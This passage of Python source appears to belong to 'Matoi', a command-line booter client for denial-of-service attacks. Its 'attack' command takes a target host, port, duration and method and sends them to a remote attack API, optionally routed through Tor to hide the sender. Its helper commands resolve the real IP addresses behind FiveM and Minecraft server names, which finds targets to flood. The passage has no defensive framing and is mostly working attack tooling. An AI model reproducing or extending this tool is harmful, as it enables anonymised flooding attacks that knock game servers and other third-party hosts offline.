        print(f"{Fore.LIGHTMAGENTA_EX}tor{Fore.RESET}        - tor connection (on/off)      - {Fore.WHITE}D{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}testtor{Fore.RESET}    - test tor connection           - {Fore.WHITE}D{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}minecraft{Fore.RESET}  - Resolve minecraft domain      - {Fore.WHITE}D{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}fivem{Fore.RESET}      - cfx resolve                  - {Fore.WHITE}D{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}plans{Fore.RESET}      - List of Plans                - {Fore.WHITE}D{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}addon{Fore.RESET}      - addons function              - {Fore.WHITE}D{Fore.RESET}")
        print(f"{Fore.LIGHTMAGENTA_EX}clear{Fore.RESET}      - clears console               - {Fore.WHITE}D{Fore.RESET}")
        print("")
        main(user, password, tor)

    if command.startswith("attack"):
        parts = command.split()

        if len(parts) != 5:
            print(f"{Fore.RED}! Invalid command format. Expected: attack <host> <port> <time> <method>{Fore.RESET}")
            main(user, password, tor)
        else:
            attack, ip, port, time, method = parts
        
            os.system("cls")
            print("")
            print(attackbanner)
            print("")
            print(f"                     {Fore.LIGHTGREEN_EX}𝓪𝓽𝓽𝓪𝓬𝓴 𝓼𝓮𝓷𝓽!{Fore.RESET}")
            print(f"                     IP: {Fore.LIGHTRED_EX}{ip}{Fore.RESET}")
            print(f"                     PORT: {Fore.LIGHTRED_EX}{port}{Fore.RESET}")
            print(f"                     TIME: {Fore.LIGHTRED_EX}{time}s{Fore.RESET}")
            print(f"                     METHOD: {Fore.LIGHTRED_EX}{method}{Fore.RESET}")
            print("")

            if tor == "off":
                response = requests.get(f'https://api.failed.lol/matoi/start?node=node1&user={user}&password={password}&method={method}&time={time}&host={ip}&port={port}')

                if response.status_code == 200:
                    print(f"{Fore.LIGHTGREEN_EX}Attack request sent successfully to the server! {Fore.RESET}")
                    main(user, password, tor)
                if response.status_code == 400:
                    print(f"{Fore.LIGHTGREEN_EX}Attack request sent successfully to the server!{Fore.RESET}")
                    main(user, password, tor)
                if response.status_code == 508:
                    print(f"{Fore.LIGHTRED_EX}Global cooldown or the host has been limited, please wait!{Fore.RESET}")
                    main(user, password, tor)
                else:
                    print(f"{Fore.LIGHTRED_EX}Failed to send the attack request. Server response: {response.status_code}{Fore.RESET}")
                    main(user, password, tor)
            if tor == "on":
                response = tor_request(f'https://api.failed.lol/matoi/start?node=node1&user={user}&password={password}&method={method}&time={time}&host={ip}&port={port}')

                if response.status_code == 200:
                    print(f"{Fore.LIGHTGREEN_EX}Attack request sent successfully to the server!{Fore.RESET}")
                    main(user, password, tor)
                if response.status_code == 400:
                    print(f"{Fore.LIGHTGREEN_EX}Attack request sent successfully to the server!{Fore.RESET}")
                    main(user, password, tor)
                if response.status_code == 508:
                    print(f"{Fore.LIGHTRED_EX}Global cooldown or the host has been limited, please wait!{Fore.RESET}")
                    main(user, password, tor)
                else:
                    print(f"{Fore.LIGHTRED_EX}Failed to send the attack request, Server response: {response.status_code}{Fore.RESET}")
                    main(user, password, tor)
    elif command.startswith("addon "):
        addon_name = command.split()[1]
        load_addon(addon_name)
        main(user, password, tor)

    if command == "clear":
        clear(user, password, tor)

    if command.startswith("fivem"):
        parts = command.split()

        if len(parts) != 2:
            print(f"{Fore.RED}! Invalid command format. Expected: fivem <cfx link>{Fore.RESET}")
            main(user, password, tor)
        else:
            fivem, cfx = parts
            url = f"{cfx}"
            target_info = resolve_cfx_url(url)
            print(target_info)
            main(user, password, tor)
    if command.startswith("minecraft"):
        parts = command.split()

        if len(parts) != 2:
            print(f"{Fore.RED}! Invalid command format. Expected: minecraft <server domain>{Fore.RESET}")
            main(user, password, tor)
        else:
            minecraft, domain = parts
            response = requests.get(f"https://api.mcstatus.io/v2/status/java/{domain}")
            if response.status_code == 200:
                data = response.json()
                print(data["ip_address"])

    if command.startswith("tor"):
        parts = command.split()

        if len(parts) != 2:
            print(f"{Fore.RED}! Invalid command format. Expected: tor <on/off>{Fore.RESET}")
            main(user, password, tor)
        else:
            tor, status = parts
            if status == "on":
                tor = "on"
                print(f"[LOG] {Fore.GREEN}Tor has been succesfuly started and connected to! {Fore.RESET}")
                main(user, password, tor)
            if status == "off":
                tor = "off"
                print(f"[LOG] {Fore.RED}Tor has been stopped and disconnected from! {Fore.RESET}")
                main(user, password, tor)
    if command.startswith("test"):
        parts = command.split()

        if len(parts) != 2:
            print(f"{Fore.RED}! Invalid command format. Expected: test <connection type>{Fore.RESET}")
            main(user, password, tor)
        else:
            test, connection = parts
            if connection == "tor":
                url = "http://check.torproject.org"
                response = tor_request(url)
                if response:
                    if tor == "on": 
                        print(f"[TEST-LOG] {Fore.GREEN} TOR IS WORKING! {Fore.RESET}")
                        main(user, password, tor)
                    else:
                        print(f"[TEST-LOG] {Fore.RED}TOR IS NOT WORKING!{Fore.RESET}")
                        main(user, password, tor)
                else:
                    print(f"[TEST-LOG] {Fore.RED}TOR IS NOT WORKING!{Fore.RESET}")
                    main(user, password, tor)
            else:
                print(f"{Fore.RED}! Unknow connection, List of connections: tor{Fore.RESET}")
                main(user, password, tor)

    else:
        print("Unknow command")
        main(user, password, tor)

if sys.platform == "win32":
    os.system('chcp 65001')
    sys.stdout.reconfigure(encoding='utf-8')
    print(f"[MATOI-LOG] {Fore.GREEN}Pre-Starting tor client! This may take a while.")
    tor_process = start_tor()
    login("node1")
else:
    sys.stdout.reconfigure(encoding='utf-8')
    print(f"[MATOI-LOG] {Fore.GREEN}Pre-Starting tor client! This may take a while.")
    tor_process = start_tor()
    login("node1")
